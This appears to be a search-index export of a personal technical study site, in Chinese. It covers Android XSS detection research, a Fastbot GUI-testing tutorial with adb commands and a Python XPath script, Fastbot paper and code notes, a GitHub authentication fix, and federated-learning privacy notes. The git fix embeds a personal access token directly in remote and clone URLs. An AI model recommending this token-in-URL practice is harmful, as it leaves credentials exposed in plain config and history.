Unit的決定是“是”，則它允許物件註冊並物件取得 Java 類別的存取方法，從中可以存取不同的移動庫。 如果威脅防護單元做出「否」決定，則會停用 Java 物件並封鎖網站。 Experiment # Tool # RapidMiner Softwrare Platform\nDataset # 作者自行提出一個Dataset叫做APK_XSS_ATTACK，為了收集基準數據，創建了演示受害者應用程式並對其發起了即時攻擊，然後在運行時記錄了這些即時攻擊。 作者取得了 17 個即時攻擊條目並記錄了 XSS 攻擊的模式，這樣我們產生了 444 個原始 XSS 攻擊以滿足標準資料集要求。 在此資料集中，攻擊比例為 50%。 作者收集了 20 個 APK 的 460 個樣本。而提取的features如下 Result # 在實驗中，從Selection Algorithm中的數據如下可以知道，API Name這個Feature是最重要的，其次是Permission或是Location 從F-Score和Accuracy可以知道，最好的演算法是Random Forest；其次是E-SVM 但從花費時間來看，E-SVM花的時間是最多的 "},{"id":108,"href":"/tools/others/android-app-crawler/fastbot-android/","title":"Fastbot Android","section":"Tools","content":" Fastbot Android # 以下流程皆是參考CSDN-Android APP穩定性測試工具Fastbot和官方中文教學\n一般使用 # 把repo clone下來，並且把一些檔案複製到手機 $ git clone https://github.com/bytedance/Fastbot_Android.git $ cd Fastbot_Android $ adb push fastbot-thirdpart.jar /sdcard $ adb push framework.jar /sdcard $ adb push monkeyq.jar /sdcard $ adb push libs/. /data/local/tmp/ dump apk內部會使用到的strings，並且複製到手機 $ aapt2 dump strings \u0026lt;your apk name\u0026gt; \u0026gt; max.valid.strings $ adb push max.valid.strings /sdcard 獲取device number和package name $ adb devices List of devices attached 24121JEGR04513 device $ aapt2 dump badging \u0026#34;Spotify_ Music and Podcasts_8.9.60.560_APKPure.apk\u0026#34; | findstr \u0026#34;package\u0026#34; package: name=\u0026#39;com.spotify.music\u0026#39; versionCode=\u0026#39;116920144\u0026#39; versionName=\u0026#39;8.9.60.560\u0026#39; platformBuildVersionName=\u0026#39;14\u0026#39; platformBuildVersionCode=\u0026#39;34\u0026#39; compileSdkVersion=\u0026#39;34\u0026#39; compileSdkVersionCodename=\u0026#39;14\u0026#39; uses-permission: name=\u0026#39;com.sec.android.app.clockpackage.permission.READ_ALARM\u0026#39; 實際測試 $ adb shell CLASSPATH=/sdcard/monkeyq.jar:/sdcard/framework.jar:/sdcard/fastbot-thirdpart.jar exec app_process /system/bin com.android.commands.monkey.Monkey -p \u0026lt;package name\u0026gt; --agent reuseq --running-minutes \u0026lt;遍歷時長\u0026gt; --throttle \u0026lt;事件頻率\u0026gt; -v -v --- $ adb shell CLASSPATH=/sdcard/monkeyq.jar:/sdcard/framework.jar:/sdcard/fastbot-thirdpart.jar exec app_process /system/bin com.android.commands.monkey.Monkey -p com.spotify.music --agent reuseq --running-minutes 1 --throttle 500 -v -v --output-directory /sdcard/fastbot_results\u0026amp;adb pull /sdcard/fastbot_results D:\\Downloads 輸入自訂Strings # Download ADBKeyBoard，安裝後設定預設keyboard為ADBKeyboard $ wget https://github.com/senzhk/ADBKeyBoard/raw/master/ADBKeyboard.apk $ adb install ADBKeyboard.apk $ adb shell ime enable com.android.adbkeyboard/.AdbIME $ adb shell ime set com.android.adbkeyboard/.AdbIME 設定config並push到手機 $ echo \u0026#34;max.randomPickFromStringList = true\u0026#34; \u0026gt; max.config $ adb push max.config /sdcard 設定像要輸入的strings並push到手機 $ echo \u0026#34;test string\u0026#34; \u0026gt; max.strings $ adb push max.strings /sdcard :::info\n如何設定成原本的keyboard $ adb shell ime reset 傳送text $ adb shell am broadcast -a ADB_INPUT_TEXT --es msg \u0026#39;test\u0026#39; 全選目前textview的strings $ adb shell am broadcast -a ADB_INPUT_TEXT --es mcode \u0026#39;4096,29\u0026#39; Delete Strings $ adb shell am broadcast -a ADB_INPUT_CODE --ei code 67 :::\n自訂前期的Script # 如果想要自行設定前期的登入或是註冊這樣的flow，就可以利用這個模式，只要先設定好XPATH和action，Fastbot就會按照我們給定的config去執行，執行完了之後就會繼續執行我們前面給的command依序crawl\n設定config # 這個部分有點複雜，如果是像spotify這樣因為無法screenshot而無法使用Appium Inspector工具的就會更複雜\n在PC上創一個max.xpath.actions文件 利用Maxim知道目前的activity name $ git clone https://github.com/zhangzhao4444/Maxim.git $ cd Maxim $ adb push framework.jar /sdcard $ adb push monkey.jar /sdcard $ adb shell CLASSPATH=/sdcard/Maxim/monkey.jar:/sdcard/Maxim/framework.jar exec app_process /system/bin tv.panda.test.monkey.api.CurrentActivity [Maxim] current activity: [Maxim] // com.spotify.login.loginflowimpl.LoginActivity 獲取想要互動的View的XPATH 如果可以screenshot的話，就可以利用Appium-Inspector，否則可以用我給的script慢慢爬，只要手機USB連線，並且開啟想要爬的activity頁面，執行下方script，就會print出目前和該app有關的clickable/editable view XPATH，以下用spotify為例 :::spoiler Fetch XPATH Script import os import uiautomator2 as u2 import xml.etree.ElementTree as ET def adb_devices() -\u0026gt; str: # 取得所有模擬器名稱與狀態 cmd = \u0026#39;adb devices\u0026#39; process = os.popen(cmd) result = process.read().split(\u0026#39;\\n\u0026#39;) text = [] for line in result: if \u0026#39;List of devices\u0026#39; not in line and line != \u0026#39;\u0026#39; and line != \u0026#39; \u0026#39;: # 去掉標題跟空白字串 text.append(line) devices = {} for i in range(len(text)): words = text[i].split(\u0026#39;\\t\u0026#39;) # 格式: emulator-5554\\tdevice if \u0026#39;device\u0026#39; in words[1]: # 只存有啟動的模擬器 devices[i] = words[0] # 用模擬器index當key if len(devices) == 0: print(\u0026#39;[x] None emulator is running\u0026#39;) raise Exception return devices def connect_single_device(emulator: str) -\u0026gt; u2.Device: try: d = u2.connect(emulator) return d except: print(\u0026#39;[x] Unable to connect to the emulator\u0026#39;) raise Exception def generate_xpath(view): \u0026#34;\u0026#34;\u0026#34; 根据视图的属性生成 XPath。 :param view: 视图的属性字典 :return: 生成的 XPath 字符串 \u0026#34;\u0026#34;\u0026#34; xpath = f\u0026#34;//{view[\u0026#39;class\u0026#39;]}\u0026#34; conditions = [] if view[\u0026#39;index\u0026#39;]: conditions.append(f\u0026#34;@index=\u0026#39;{view[\u0026#39;index\u0026#39;]}\u0026#39;\u0026#34;) if view[\u0026#39;text\u0026#39;]: conditions.append(f\u0026#34;@text=\u0026#39;{view[\u0026#39;text\u0026#39;]}\u0026#39;\u0026#34;) if view[\u0026#39;resource-id\u0026#39;]: conditions.append(f\u0026#34;@resource-id=\u0026#39;{view[\u0026#39;resource-id\u0026#39;]}\u0026#39;\u0026#34;) if view[\u0026#39;package\u0026#39;]: conditions.append(f\u0026#34;@package=\u0026#39;{view[\u0026#39;package\u0026#39;]}\u0026#39;\u0026#34;) if view[\u0026#39;content-desc\u0026#39;]: conditions.append(f\u0026#34;@content-desc=\u0026#39;{view[\u0026#39;content-desc\u0026#39;]}\u0026#39;\u0026#34;) if view[\u0026#39;clickable\u0026#39;]: conditions.append(f\u0026#34;@clickable=\u0026#39;{view[\u0026#39;clickable\u0026#39;]}\u0026#39;\u0026#34;) if conditions: xpath += \u0026#34;[\u0026#34; + \u0026#34; and \u0026#34;.join(conditions) + \u0026#34;]\u0026#34; return xpath def main(emulator: str): d = connect_single_device(emulator) # get the UI hierarchy dump content xml = d.dump_hierarchy(compressed=False, pretty=True, max_depth=50) root = ET.fromstring(xml) if clickable_views.get(activity_level) is None: clickable_views[activity_level] = [] if editable_views.get(activity_level) is None: editable_views[activity_level] = [] # Find all clickable \u0026amp; editable views for view in root.iter(): resource_id = view.attrib.get(\u0026#39;resource-id\u0026#39;, \u0026#39;\u0026#39;) clickable = view.attrib.get(\u0026#39;clickable\u0026#39;, \u0026#39;false\u0026#39;) package_name = view.attrib.get(\u0026#39;package\u0026#39;, \u0026#39;\u0026#39;) if any(app_name.lower() in a for a in [resource_id, package_name]) and clickable == \u0026#39;true\u0026#39;: print(\u0026#34;Clickable View XPATH: \u0026#34;, generate_xpath(view.attrib)) for view in root.findall(\u0026#34;.//*[@class=\u0026#39;android.widget.EditText\u0026#39;]\u0026#34;): resource_id = view.attrib.get(\u0026#39;resource-id\u0026#39;, \u0026#39;\u0026#39;) if app_name.lower() in resource_id: print(\u0026#34;Editable View XPATH: \u0026#34;, generate_xpath(view.attrib)) if __name__ == \u0026#39;__main__\u0026#39;: clickable_views = {} editable_views = {} app_name = \u0026#39;Spotify\u0026#39; activity_level = 0 try: emulators = adb_devices() except: print(\u0026#39;[x] Cannot get the list of emulators, the program will be terminated. Please use adb devices to check if the emulator is running\u0026#39;) exit() main(emulators[0]) ::: $ python fetchXPATH.py Clickable View XPATH: //android.widget.Button[@index=\u0026#39;0\u0026#39; and @text=\u0026#39;Sign up free\u0026#39; and @package=\u0026#39;com.spotify.music\u0026#39; and @clickable=\u0026#39;true\u0026#39;] Clickable View XPATH: //android.widget.Button[@index=\u0026#39;1\u0026#39; and @text=\u0026#39;Continue with Google\u0026#39; and @package=\u0026#39;com.spotify.music\u0026#39; and @clickable=\u0026#39;true\u0026#39;] Clickable View XPATH: //android.widget.Button[@index=\u0026#39;2\u0026#39; and @text=\u0026#39;Continue with Facebook\u0026#39; and @package=\u0026#39;com.spotify.music\u0026#39; and @clickable=\u0026#39;true\u0026#39;] Clickable View XPATH: //android.widget.Button[@index=\u0026#39;3\u0026#39; and @text=\u0026#39;Log in\u0026#39; and @package=\u0026#39;com.spotify.music\u0026#39; and @clickable=\u0026#39;true\u0026#39;] 接下來就把XPATH貼到下方格式的地方就可以了 在同一個activity的步驟不需要拆分，詳細說明可以看Fastbot handbook [ { \u0026#34;prob\u0026#34;: 1, \u0026#34;activity\u0026#34;: \u0026#34;com.spotify.login.loginflowimpl.LoginActivity\u0026#34;, \u0026#34;times\u0026#34;: 1, \u0026#34;actions\u0026#34;: [ { \u0026#34;xpath\u0026#34;: \u0026#34;//android.widget.Button[@index=\u0026#39;3\u0026#39; and @text=\u0026#39;Log in\u0026#39; and @package=\u0026#39;com.spotify.music\u0026#39; and @clickable=\u0026#39;true\u0026#39;\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;CLICK\u0026#34;, \u0026#34;throttle\u0026#34; : 2000 }, { \u0026#34;xpath\u0026#34;: \u0026#34;//*[@resource-id=\u0026#39;com.spotify.music:id/username_text\u0026#39;]\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;CLICK\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;throttle\u0026#34; : 2000 }, { \u0026#34;xpath\u0026#34;: \u0026#34;//*[@resource-id=\u0026#39;com.spotify.music:id/password_text\u0026#39;]\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;CLICK\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;throttle\u0026#34; : 2000 }, { \u0026#34;xpath\u0026#34;: \u0026#34;//*[@resource-id=\u0026#39;com.spotify.music:id/login_button\u0026#39; and @text=\u0026#39;Log in\u0026#39;]\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;CLICK\u0026#34;, \u0026#34;throttle\u0026#34; : 2000 } ] } ] 把以上json格式填寫好後，丟到Json Checker檢查有無問題，注意最一開始和最後一定是中括號，格式正確後再填寫到==max.xpath.actions==，並且丟到手機上 $ adb push max.xpath.actions /sdcard 注意 # :::info\n如果有想要填寫文字的情況就一定要保證是用ADBKeyboard的狀態下才會如實的填寫我們設定好的text Fastbot預設會到/sdcard抓max.xpath.actions，所以不要放到其他地方 ::: "},{"id":109,"href":"/survey-papers/android-+-security/gui-testing/fastbot_-a-multi-agent-model-based-test-generation-system/","title":"Fastbot: A Multi-Agent Model-Based Test Generation System","section":"Survey Papers","content":" Fastbot: A Multi-Agent Model-Based Test Generation System # :::info Cai, T., Zhang, Z., \u0026amp; Yang, P. (2020, October). Fastbot: A multi-agent model-based test generation system Beijing Bytedance Network Technology Co., Ltd. In Proceedings of the IEEE/ACM 1st International Conference on Automation of Software Test (pp. 93-96). ::: 參考資料: https://mp.weixin.qq.com/s/QhzqBFZygkIS6C69__smyQ "},{"id":110,"href":"/survey-papers/android-+-security/gui-testing/fastbot2_-reusable-automated-model-based-gui-testing-for-android-enhanced-by-reinforcement-learning/","title":"Fastbot2: Reusable Automated Model-based GUI Testing for Android Enhanced by Reinforcement Learning","section":"Survey Papers","content":" Fastbot2: Reusable Automated Model-based GUI Testing for Android Enhanced by Reinforcement Learning # :::info Lv, Z., Peng, C., Zhang, Z., Su, T., Liu, K., \u0026amp; Yang, P. (2022, October). Fastbot2: Reusable automated model-based gui testing for android enhanced by reinforcement learning. In Proceedings of the 37th IEEE/ACM International Conference on Automated Software Engineering (pp. 1-5). ::: 參考資料: https://github.com/bytedance/Fastbot_Android/blob/main/handbook-cn.md 動機與貢獻 # 現有的GUI testing都是無法重複使用之前測試的結果，但fastbot2可以(特別是event-activity transitions)。有兩個貢獻\n提出reusable automated model-based GUI testing technique，並且利用reinforcement learning進行增強，以滿足持續測試的實際需求 Fastbot2 優於最先進的技術。它也已成功部署在位元組跳動的 CI 流程中，並因其改善應用程式品質的能力而獲得了積極的回饋 主要流程 # 其實很簡單，就是2個東西合併，一個是可以儲存過往測試的流程中，event和activity之間的關係(transitions)，該機率模型就是在記憶每一次的測試round中，獲得的一些knowledge，比方說哪一個哪些event會跑到哪個activity之類的； 旨在根據曾經探索的頁面的情況，對當前的備選組件進行挑選，從中選出最有可能觸發未曾探索過的頁面的組件，也就更有可能提升測試結果的 Activity 覆蓋率\n另一個就是決定如何event的RL agent 3. a1a3: 擷取apk檔案中的valid text(static text labels widgets)；接著安裝在手機上，如果之前有測試過就把相關紀錄以及儲存的東西提取出來給機率模型 4. b1b6: 首先把目前的GUI畫面傳給hyper-event abstractor，這樣就會知道目前畫面有哪些event可以觸發，接著藉由機率模型以及RL agent選擇一個event，並且實際執行，最後把下一個畫面的資訊同步更新給機率模型以及historical data中，重複b1~b6的步驟直到時間結束\n如以下這個示意圖，當頭條這個App被initial trigger之後，按了e1這個event會跑到activity 2，而按了e2和e5這2個events，都會跑到activity 3 因此，作者就給出了下面的機率模型，觸發e2和e4，會100%的跑到activity 3和activity 1 具體來說，對於當前一個潛在可以交互的組件 e，Fastbot 會根據之前探索的情況讀取這個組件 e 曾經可以觸發的 Activity，並將目前本輪探索到的 Activity 與歷史數據進行對比。如果目前 Fastbot 並沒有觸發到組件 e 中曾經觸發過的部分 Activity，並且相較於當前頁面的其他組件來說，此組件 e 仍未被觸發的 Activity 數量最多，那麽此組件 e 就會被概率模型選中。如下圖所示，概率模型會計算每一個 e 的概率，E(e) 代表此組件 e 之前所觸發的 Activity 中未在本輪中被觸發的比例。 需要說明的是，此概率模型會在 Fastbot 的過程中隨時保存，並且也會在下一次測試的時候被使用。這也是此模型被稱為概率模型的原因，因為它記錄了應用的歷史探索的情況。 如果此應用從未被測試過，也並未儲存過概率模型，那麽 Fastbot 會以隨機選擇組件的方式應對冷啟動的問題。\n# Code Analysis # 可以直接看官方的說明: https://github.com/bytedance/Fastbot_Android/blob/main/fastbot_code_analysis.md 總之如果想要研究具體決策的model，要看Native Folder(c++)，如果想要知道native怎麼和mobile溝通，要看mokey folder(java) 我是只有看native，要具體來看他怎麼進行決策。 從上到下的順序如下\nnative/project/jni/fastbot_native.cpp # 該文件為上層的Java層提供了JNI的介面實作。其中 b0bhkadf函數提供了決策的核心功能。 std::string operationString = _fastbot_model-\u0026gt;getOperate(xmlString, activityString); native/model/Model.cpp std::string Model::getOperate(const ElementPtr \u0026amp;element, const std::string \u0026amp;activity, const std::string \u0026amp;deviceID) { OperatePtr operate = getOperateOpt(element, activity, deviceID); std::string operateString = operate-\u0026gt;toString(); // wrap the operation as a json object and get its string return operateString; } OperatePtr Model::getOperateOpt(const ElementPtr \u0026amp;element, const std::string \u0026amp;activity, const std::string \u0026amp;deviceID) { ... action = std::dynamic_pointer_cast\u0026lt;Action\u0026gt;(agent-\u0026gt;resolveNewAction()); agent-\u0026gt;updateStrategy(); 這裡有兩個主要的操作，一個是#85選出一個action送到java layer執行，另外一個是要update agent，以下先列出如何選出action native/agent/AbstractAgent.cpp ActionPtr AbstractAgent::resolveNewAction() { // update priority this-\u0026gt;adjustActions(); ActionPtr action = this-\u0026gt;selectNewAction(); _newAction = std::dynamic_pointer_cast\u0026lt;ActivityStateAction\u0026gt;(action); return action; } native/agent/ModelReusableAgent.cpp: 這是最重要的核心，也就是決定了如何判斷要哪一個action(就是hyper-event)要被執行 ActionPtr ModelReusableAgent::selectNewAction() { ActionPtr action = nullptr; action = this-\u0026gt;selectUnperformedActionNotInReuseModel(); if (nullptr != action) { BLOG(\u0026#34;%s\u0026#34;, \u0026#34;select action not in reuse model\u0026#34;); return action; } action = this-\u0026gt;selectUnperformedActionInReuseModel(); if (nullptr != action) { BLOG(\u0026#34;%s\u0026#34;, \u0026#34;select action in reuse model\u0026#34;); return action; } action = this-\u0026gt;_newState-\u0026gt;randomPickUnvisitedAction(); if (nullptr != action) { BLOG(\u0026#34;%s\u0026#34;, \u0026#34;select action in unvisited action\u0026#34;); return action; } // if all the actions are explored, use those two methods to generate new action based on q value. // there are two methods to choose from. // based on q value and a uniform distribution, select an action with the highest value. action = this-\u0026gt;selectActionByQValue(); if (nullptr != action) { BLOG(\u0026#34;%s\u0026#34;, \u0026#34;select action by qvalue\u0026#34;); return action; } // use the traditional epsilon greedy strategy to choose the next action. action = this-\u0026gt;selectNewActionEpsilonGreedyRandomly(); if (nullptr != action) { BLOG(\u0026#34;%s\u0026#34;, \u0026#34;select action by EpsilonGreedyRandom\u0026#34;); return action; } BLOGE(\u0026#34;null action happened , handle null action\u0026#34;); return handleNullAction(); } native/agent/ModelReusableAgent.cpp: 這一段開始就是說明如何update agent，包含用在論文中提到的那些sarsa formula更新q-value等等 void ModelReusableAgent::updateStrategy() { if (nullptr == this-\u0026gt;_newAction) // need to call resolveNewAction to update _newAction return; // _previousActions is a vector storing certain amount of actions, of which length equals to SarsaNStep. if (!this-\u0026gt;_previousActions.empty()) { this-\u0026gt;computeRewardOfLatestAction(); this-\u0026gt;updateReuseModel(); double value = getQValue(_newAction); for (int i = static_cast\u0026lt;int\u0026gt;(this-\u0026gt;_previousActions.size()) - 1; i \u0026gt;= 0; i--) { double currentQValue = getQValue(_previousActions[i]); double currentRewardValue = this-\u0026gt;_rewardCache[i]; // accumulated reward from the newest actions value = currentRewardValue + SarsaRLDefaultGamma * value; // Should not update the q value during step (action edge) between i+1 to i+n-1 // The following statement is slightly different from the original sarsa RL paper. // Considering to move the next statement outside of this block. // Since only the oldest action should be updated. if (i == 0) setQValue(this-\u0026gt;_previousActions[i], currentQValue + this-\u0026gt;_alpha * (value - currentQValue)); } } else { BDLOG(\u0026#34;%s\u0026#34;, \u0026#34;get action value failed!\u0026#34;); } // add the new action to the back of the cache. this-\u0026gt;_previousActions.emplace_back(this-\u0026gt;_newAction); if (this-\u0026gt;_previousActions.size() \u0026gt; SarsaNStep) { // if the cached length is over SarsaNStep, erase the first action from cache. this-\u0026gt;_previousActions.erase(this-\u0026gt;_previousActions.begin()); } } code和論文中的公式對應 # 以下function都在native/agent/ModelReusableAgent.cpp/中\nEqu.1: probabilityOfVisitingNewActivities() $P(e,A_i)=\\frac{N(e,A_i)}{N(e)}$ Equ.2: selectUnperformedActionInReuseModel() $P_M(e_i)=exp({\\mathbb{E}(e_i)\\over\\alpha})/\\sum_{e_i\\in\\mathcal{E}_c}exp({\\mathbb{E}(e_i)\\over\\alpha})$ Equ.3: updateStrategy() $Q(e_t)+\\alpha(G_{t,t+n}-Q(e_t))$ $G_{t,t+n}=r_{t+1}+\\gamma r_{t+2}+\\dots+\\gamma^n Q(e_{t+n})$ Equ.4: computeRewardOfLatestAction() $r_{t+1}={\\mathbb{E}(e_t)\\over\\sqrt{N(e_t)+1}}+{V\\over\\sqrt{N(A_t)+1}}$ Equ.5: getStateActionExpectationValue() $V=n_h+0.5*n_c+\\sum_{e_i\\in\\mathcal{E}_c}\\mathbb{E}(e_i)$ Equ.6: selectActionByQValue() $P_Q(e_i)=exp({{Q(e_i)\\over\\beta}})/{\\sum_{e_i\\in\\mathcal{E}_c}exp({Q(e_i)\\over\\beta})}$ Inline Equation: probabilityOfVisitingNewActivities() $\\mathbb{E}(e_i)=\\sum_{A\\notin\\mathcal{A}_t}P(e_i,A),0\\le i\\le |\\mathcal{E}_c|$ "},{"id":111,"href":"/problem-solutions/fatal_-authentication-failed-for-https___github.com_username_repository.git_/","title":"fatal: Authentication failed for `'https://github.com/{username}/{repository}.git/'`","section":"Problem Solutions","content":" fatal: Authentication failed for 'https://github.com/{username}/{repository}.git/' # tags: problem solution # Solution # According to this page Go to https://github.com/settings/tokens (or setting/Developer setting/Tokens (classic)/) and click Generate new token to apply a new token.\nIf you want to push repo Payload: git remote set-url origin https://ghp_XXXXXXXXXXXXXXXXXXX@github.com/howarder3/test_repo.git\nIf you want to clone your own private repo in new computer Payload: git clone https://ghp_XXXXXXXXXXXXXXXXXXX@github.com/howarder3/test_repo.git\n"},{"id":112,"href":"/survey-papers/federated-learning/fedml-he---an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system---notes/","title":"FedML-HE - An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System - Notes","section":"Survey Papers","content":" FedML-HE - An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System - Notes # tags: Meeting Paper NTU # :::info Jin, W., Yao, Y., Han, S., Joe-Wong, C., Ravi, S., Avestimehr, S., \u0026amp; He, C. (2023). FedML-HE: An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System. arXiv preprint arXiv:2303.10837. ::: [TOC]\nBackground # 聯邦學習：攻擊方式 # :::spoiler\n成員推理攻擊 攻擊者試圖確定某些資料是否是訓練的一部分與模型反轉攻擊一樣，攻擊者利用返回的分類分數來創建多個這些 影子 模型，模型與受攻擊的原始模型具有相似的分類邊界。 給定一個 黑盒 機器學習模型和一個資料記錄，確定該記錄是否用作模型的訓練資料集的一部分，被證明是可能的，具有極高的準確性。 因此，僅對在給定輸入上返回模型輸出的黑盒 API 進行簡單的查詢訪問，就可能洩露有關模型訓練所依據的各個資料記錄的大量訊息。 推理攻擊的準確性隨著類別數量的增加而增加。 :::\nWhat is Multi Party Computation (MPC)? # :::spoiler\n一方面，這突破了我們對溝通、合作與娛樂方式的想像，但另一方面，這也使得我們更容易受到資料誤用與竊取的侵害，尤其當這些資料與內部安全金鑰全都列為集中式管理。於是朝向安全多方運算(multi-party computation，MPC)技術發展。\nMPC技術是加密技術的次分支。利用這項技術，不同機構或是同一機構內部的不同部門在使用各自的私密資料來共同進行運算時，可以避免向彼此或第三方揭露這些資料，就能取得運算結果。\nimec設於比利時魯汶大學的「電腦安全與產業密碼學(Computer Security and Industrial Cryptography，COSIC)研究團隊」將於本文探討MPC技術可行或不可行的觀點及在哪些應用上發揮附加價值，並分析這項密碼學奇蹟為何還在尋找商用的甜蜜點。\n有關MPC更詳細的說明請參閱Secure multi-party computation (MPC) 介绍 :::\nWhat is Differential Privacy? - Apple 怎麼安全的收集我們的隱私？Differential Privacy 的簡介與應用 # :::spoiler\nDifferential Privacy # Differential Privacy (DP) 是一種隱私保護 (Privacy-Preserving) 的演算法，可以在收集群體資料的同時能夠保護單體用戶的 Data。從應用領域來說，DP 不能保護用戶的數據不被看見，但是 DP 能做到的是保護「數據與單個用戶的關聯」。\nDP的概念很簡單，就是加入隨機性。如果匿名數據裡面包含的數據是經過隨機處理的，那就很難通過其他線索來反推回個人數據。以 Netflix Prize Data 的例子中，DP 的隨機性可以加入在用戶評分或是評分日期中，甚至可以稍微擾亂電影 ID。只要用戶評價的數據有稍微的隨機性，就很難透過 IMDB 之類的第三方數據反推回用戶 ID。\n加入隨機性的程度會影響隱私保護的程度。通常隨機性參數會用符號 ε (epsilon) 來表示，因此也被稱為 ε- Differential Privacy。在 DP 中，「隱私保護」與「數據可用性」往往是一個 Trade-off，因此選擇適當的 ε 也是至關重要。\nDifferential Privacy 的適用時機 # Differential Privacy 是一種應用層面很廣的隱私保護方法。在實務中，DP 幾乎是另用領域最廣的隱私保護算法，因為他的方法足夠簡單，在各種任務中都可以順利應用，例如：推薦算法、趨勢預測、用戶分群等等。\n但是 DP 對於數據無可避免的傷害也限制了他的可用性，因此對於一些對於數據要求較高的機器學習算法，例如機器視覺，就不太能夠直接使用。 :::\nWhat is CKKS? # CKKS是2017年提出的同態加密方案。它支持浮點向量在密文空間的加減乘運算並保持同態，但是只支持有限次乘法的運算。\n詳細的算法可以參考原文章\n什麼是 DevOps？ # :::spoiler\nDevOps 簡而言之，就是 Development + Operations ，也就是開發與維運。但大部分的文章都會說是「開發」「測試」「維運」三者的結合。如同下面這張圖想表示的意義一樣，當三者有了交集，即是 DevOps DevOps 想要達成的目標為何？ # 從 Patrick Debois 發現的問題與參考葉大一句話囊括 DevOps 的目標一文，可以了解，最大的目標即為速度。「天下武功，唯快不破」，從發現需求到產品上線的時間越短，能得到的回饋與市場也就越大；但快還不夠，還要好，也就是要有品質！如果只有快，而沒有品質，只是更快把 bug 上線，並破壞企業名聲而已。如何兼顧速度與品質，即為 DevOps 的主要目標。 DevOps 到底在做什麼？\n為何會出現 DevOps ，相信已經有個感覺了。那它究竟在做些什麼事呢？\n有文章會提到用 CALMS 的角度來說明 DevOps 的要領，這是下列五個英文單字的縮寫：\nCulture Automation Lean Measurement Sharing 這是了解 DevOps 概念的好方向之一。 :::\n什麼是MLOps？-30 Days of MLOps # :::spoiler\n用最短的一句話來解釋它的話，MLOps 就是 Machine Learning 的 DevOps 在 Machine Learning 團隊中，除了資料科學家、資料工程師、DevOps 工程師作為固定班底外，協作單位還有產品經理、後端工程師等等。我們要讓所有人可以彼此良好的協作，這需要依賴更好的維運架構。除了最直覺想到的 Model 部署外，常見的挑戰還有例如：訓練 Model、測試與分析 Model、資料的預處理等等。 :::\nHomomorphic Encryption Libraries # Palisade SEAL - Microsoft 微軟開源同態加密函式庫SEAL # :::spoiler\n微軟宣布開源簡單加密演算法函式庫（Microsoft Simple Encrypted Arithmetic Library，Microsoft SEAL），這是一個由微軟加密研究小組研發，容易使用的同態加密（Homomorphic Encryption）函式庫，現在於GitHub以MIT授權許可開源。\n越來越多資料被搬上雲端，微軟提到，他們遭遇到了便利性與隱私性的權衡問題，在考量投資利益最大化的情況下，需要盡可能的改善服務效能，或是讓傳輸更加有效率。作為交換，微軟與服務供應商共享個人資訊，不過，在傳統的加密架構下，無法在加密資料上進行任何計算，也就是說，無法在未將資料解密的情況下，供第三方進行資料操作。\n其中一種解決方法，便是把加密資料儲存在雲端，當需要的時候下載以執行有用的操作，微軟提到，這樣的方法在實務上邏輯不通，而另一種方法則是提供服務供應商解密金鑰，但這又暴露了隱私風險。\n同態加密則能解決這個問題，同態加密允許在加密資料上進行額外的處理，包括檢索或是比較等操作，整個過程不需要對資料進行解密，就能獲得正確的結果，而這在根本上解決了將資料及操作委託給第三方時，遭遇的保密問題。同態加密函式庫Microsoft SEAL的出現，允許微軟在不暴露個人訊息的狀況下，提供第三方應用雲端操作。\nModel Compression # Low Rank Decomposition 低秩矩阵分解 - Vid. Lec06 深度學習的模型壓縮與加速 Low Rank Approximation (6/9) 簡單來說就是把原本的model做拆解，變成比較小的rank，這樣的好處是運算的速度會比較快，但缺點是運算的error會增加，畢竟是拆解，也不見得能夠一模一樣 從以下實驗結果來說，左側有提到幾倍的運算效能的提升，但右邊也顯示了這樣會造成error的增加 Implementation Note # Federated Learning on AWS with FedML: Health analytics without sharing sensitive data – Part 1\nCross-Silo VS. Cross-Device in FL # :::spoiler\n模式不同 # Cross-device聯邦學習：多設備聯邦的模式。 Cross-Silo聯邦學習：與跨設備聯合學習的特征相反，Cross-Silo 聯邦學習在總體設計的某些方面非常靈活。許多組織如果只是想共享訓練模型，而不想分享數據時，cross-silo設置是非常好的選擇。Cross-Silo 聯邦學習的設置主要有以下幾個要點：數據分割、激勵機制、差異隱私、張量因子分解。 面對的客戶端不同 # Cross-device聯邦學習：Cross-device FL針對的則是便攜式電子設備、穿戴式電子設備等，統稱為物聯設備（Internet of Things, IoT devices）。 Cross-Silo聯邦學習：Cross-silo FL面對的客戶端是企業級別、機構單位級別的。 客戶端狀態不同 # Cross-device聯邦學習：無狀態，每個客戶可以僅會參與一次任務，因此通常假定在每輪計算中都有一個從未見過的客戶的新樣本。 Cross-Silo聯邦學習：有狀態，每個客戶端都可以參與計算的每一輪，並不斷攜帶狀態。 可定位性不同 # Cross-device聯邦學習：沒有獨立編號，無法直接為客戶建立索引。 Cross-Silo聯邦學習：有獨立編號，每個客戶端都有一個標識或名稱，該標識或名稱允許系統專門訪問。 \u0026hellip; # :::\n什麼是 Amazon EC2？ # :::spoiler\nAmazon Elastic Compute Cloud (Amazon EC2) 在 Amazon Web Services (AWS) Cloud 中提供可擴展的運算容量。使用 Amazon EC2 可減少前期所需的硬體投資，讓您更快速開發並部署應用程式。您可使用 Amazon EC2 按需要啟動任意數量的虛擬伺服器，設定安全性和聯網功能以及管理儲存。使用 Amazon EC2 可擴展與縮減規模，以處理需求或熱門峰值的變更，從而降低您預測流量的需求。\nAmazon EC2 提供以下功能： # 虛擬運算環境，亦即執行個體 供執行個體使用的預先設定範本，亦即 Amazon Machine Images (AMI)，在其中封裝伺服器所需的元件 (包括作業系統和其他軟體) 執行個體 CPU、記憶體、儲存和聯網功能的各種組態，亦即執行個體類型 使用金鑰對來保護執行個體的登入資訊 (AWS 會存放公有金鑰，而您則於安全位置存放私有金鑰) \u0026hellip; ::: MQTT教學（一）：認識MQTT # :::spoiler\n比較HTTP和MQTT通訊協定 # MQTT和HTTP的底層都是TCP/IP，也就是物聯網裝置可以沿用既有的網路架構和設備，只是在網路上流通的「訊息格式」以及應用程式的處理機制不同。 MQTT訊息格式 # 